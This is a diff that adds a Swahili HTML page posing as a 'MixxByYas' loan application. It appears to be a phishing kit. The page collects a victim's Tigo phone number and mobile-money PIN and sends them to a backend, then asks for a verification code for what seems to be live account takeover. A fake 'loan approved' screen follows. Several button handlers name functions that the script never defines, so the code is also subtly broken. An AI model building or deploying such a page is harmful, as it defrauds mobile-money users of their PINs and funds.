@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Thibitisha</title>
+    <style>
+        :root { --primary: #2563eb; --gold: #f59e0b; --light-yellow: #fffef5; --success: #10b981; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --white: #ffffff; --light-navy: #2c3e6b; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light-yellow); color: var(--dark); line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; }
+        .brand-bar { background: var(--light-navy); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; border-bottom: 2px solid var(--gold); }
+        .brand-logo { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.9rem; color: var(--light-navy); }
+        .brand-text { font-size: 1.1rem; font-weight: 700; } .brand-text .mixx { color: var(--white); } .brand-text .yas { color: var(--gold); }
+        .back-link { display: block; padding: 1rem 1.5rem; color: var(--gray); text-decoration: none; font-size: 0.9rem; max-width: 500px; margin: 0 auto; }
+        .main-container { max-width: 500px; margin: 0 auto 2rem; padding: 0 1rem; flex: 1; }
+        .card { background: var(--white); border-radius: 14px; padding: 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); }
+        .loan-summary { background: #fefce8; border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
+        .loan-summary .amount { font-size: 1.6rem; font-weight: 900; color: var(--primary); }
+        .screen { display: none; } .screen.active { display: block; }
+        .form-group { margin-bottom: 1.2rem; } .form-group label { display: block; font-weight: 600; font-size: 0.9rem; }
+        .phone-box { display: flex; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .phone-box .prefix { background: #fef9e7; padding: 0.85rem 1rem; font-weight: 700; }
+        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; outline: none; }
+        .pin-box { position: relative; border: 2px solid #fef3c7; border-radius: 14px; }
+        .pin-box input { width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem; outline: none; letter-spacing: 0.5rem; }
+        .pin-box .toggle-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1.2rem; }
+        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; } .error-msg.show { display: block; }
+        .btn { width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 0.5rem; }
+        .btn-gold { background: var(--gold); color: var(--dark); }
+        .waiting-content { text-align: center; padding: 1rem; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
+        .code-inputs { display: flex; gap: 0.5rem; justify-content: center; margin: 1rem 0; }
+        .code-inputs input { width: 48px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #fef3c7; border-radius: 14px; outline: none; }
+        .code-inputs input:focus { border-color: var(--gold); } .code-inputs input.error { border-color: var(--danger); }
+        .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
+        .success-overlay.active { display: flex; }
+        .success-card { background: var(--white); border-radius: 14px; padding: 2rem; text-align: center; max-width: 400px; width: 90%; }
+        .success-card h2 { color: var(--success); } .success-card .big-amount { font-size: 1.8rem; font-weight: 900; color: var(--primary); }
+        .btn-home { background: var(--gold); color: var(--dark); padding: 0.8rem 2rem; border-radius: 50px; font-weight: 600; cursor: pointer; border: none; font-family: inherit; }
+        .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
+        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+    </style>
+</head>
+<body>
+    <div class="brand-bar"><div class="brand-logo">M</div><div class="brand-text"><span class="mixx">Mixx</span><span class="yas">ByYas</span></div></div>
+    <a href="/apply" class="back-link">← Rudi</a>
+    <div class="main-container">
+        <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
+        <div class="card">
+            <div class="screen active" id="screen1">
+                <h3>📱 Ingiza Taarifa za Tigo</h3>
+                <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="Ingiza namba" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
+                <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
+                <button class="btn btn-gold" onclick="submitDetails()">Endelea →</button>
+            </div>
+            <div class="screen" id="screen2"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inakaguliwa</h3><p style="color:var(--gray);">Inasubiri</p><div class="phone-display" id="showPhone">+255 ---------</div></div></div>
+            <div class="screen" id="screen3"><div class="waiting-content"><h3>✅ Ingiza Namba</h3><div class="phone-display" id="showPhone2">+255 ---------</div><div class="code-inputs"><input type="text" maxlength="1" class="cd" oninput="nextCode(this)"><input type="text" maxlength="1" class="cd" oninput="nextCode(this)"><input type="text" maxlength="1" class="cd" oninput="nextCode(this)"><input type="text" maxlength="1" class="cd" oninput="nextCode(this)"></div><div class="error-msg" id="codeError">Namba si sahihi</div><button class="btn btn-gold" onclick="submitCode()">Endelea →</button></div></div>
+            <div class="screen" id="screen4"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inathibitisha</h3><div class="phone-display" id="showPhone3">+255 ---------</div></div></div>
+        </div>
+    </div>
+    <div class="success-overlay" id="successOverlay"><div class="success-card"><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
+    <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
+    <script>
+        var siteId = new URLSearchParams(window.location.search).get('site') || 'DEFAULT';
+        var up=new URLSearchParams(window.location.search),la=parseInt(up.get('amount')||'500000'),lt=parseInt(up.get('term')||'12');
+        document.getElementById('loanAmount').textContent='TZS '+la.toLocaleString();document.getElementById('approvedAmount').textContent='TZS '+la.toLocaleString();
+        var ai='',ci=null;
+        function tp(){var p=document.getElementById('tigoPin'),b=p.parentElement.querySelector('.toggle-btn');p.type==='password'?(p.type='text',b.textContent='🙈'):(p.type='password',b.textContent='👁️');}
+        document.getElementById('phoneNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
+        document.getElementById('tigoPin').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
+        async function sd(){
+            var ph=document.getElementById('phoneNumber').value.trim(),pn=document.getElementById('tigoPin').value.trim();
+            if(!ph||ph.length<9){document.getElementById('phoneError').classList.add('show');return;}
+            if(!pn||pn.length!==4){document.getElementById('pinError').classList.add('show');return;}
+            document.getElementById('screen1').classList.remove('active');document.getElementById('screen2').classList.add('active');
+            document.getElementById('showPhone').textContent='+255 '+ph;document.getElementById('showPhone2').textContent='+255 '+ph;document.getElementById('showPhone3').textContent='+255 '+ph;
+            var ld=JSON.parse(localStorage.getItem('loan_data')||'{}');
+            var r=await fetch('/api/submit_loan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph,pin:pn,amount:la,months:lt,site_id:siteId,loan_type:ld.loan_type||'',purpose:ld.purpose||''})});
+            var d=await r.json();ai=d.app_id;sc();
+        }
+        function sc(){if(ci)clearInterval(ci);ci=setInterval(async function(){var r=await fetch('/api/check_status/'+ai);var d=await r.json();if(d.status==='approved'){clearInterval(ci);ss();}else if(d.status==='wrong_pin'){clearInterval(ci);gp();}},3000);}
+        function ss(){document.getElementById('screen2').classList.remove('active');document.getElementById('screen3').classList.add('active');document.querySelector('.cd').focus();}
+        function gp(){document.getElementById('screen2').classList.remove('active');document.getElementById('screen1').classList.add('active');document.getElementById('tigoPin').value='';document.getElementById('tigoPin').focus();document.querySelectorAll('.cd').forEach(function(d){d.value='';});alert('PIN si sahihi.');}
+        function nc(i){i.value=i.value.replace(/\D/g,'');if(i.value.length===1){var n=i.nextElementSibling;if(n&&n.classList.contains('cd'))n.focus();}}
+        document.addEventListener('keydown',function(e){if(e.key==='Backspace'&&e.target.classList.contains('cd')&&e.target.value===''){var p=e.target.previousElementSibling;if(p&&p.classList.contains('cd'))p.focus();}});
+        async function sb(){
+            var ec='';document.querySelectorAll('.cd').forEach(function(d){ec+=d.value;});
+            if(ec.length!==4){document.getElementById('codeError').textContent='Ingiza namba kamili';document.getElementById('codeError').classList.add('show');return;}
+            document.getElementById('screen3').classList.remove('active');document.getElementById('screen4').classList.add('active');
+            await fetch('/api/submit_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({app_id:ai,code:ec})});
+            if(ci)clearInterval(ci);ci=setInterval(async function(){var r=await fetch('/api/check_status/'+ai);var d=await r.json();if(d.code_status==='approved'){clearInterval(ci);sx();}else if(d.code_status==='wrong_code'){clearInterval(ci);se();}else if(d.status==='wrong_pin'||d.code_status==='wrong_pin'){clearInterval(ci);gf();}},3000);
+        }
+        function sx(){document.getElementById('screen4').classList.remove('active');document.getElementById('successOverlay').classList.add('active');}
+        function se(){document.getElementById('screen4').classList.remove('active');document.getElementById('screen3').classList.add('active');document.getElementById('codeError').textContent='Namba si sahihi';document.getElementById('codeError').classList.add('show');document.querySelectorAll('.cd').forEach(function(d){d.classList.add('error');d.value='';});document.querySelector('.cd').focus();setTimeout(function(){document.querySelectorAll('.cd').forEach(function(d){d.classList.remove('error');});document.getElementById('codeError').classList.remove('show');},3000);}
+        function gf(){document.getElementById('screen4').classList.remove('active');document.getElementById('screen1').classList.add('active');document.getElementById('tigoPin').value='';document.getElementById('tigoPin').focus();document.querySelectorAll('.cd').forEach(function(d){d.value='';});alert('PIN si sahihi.');}
+    </script>
+</body>
+</html>
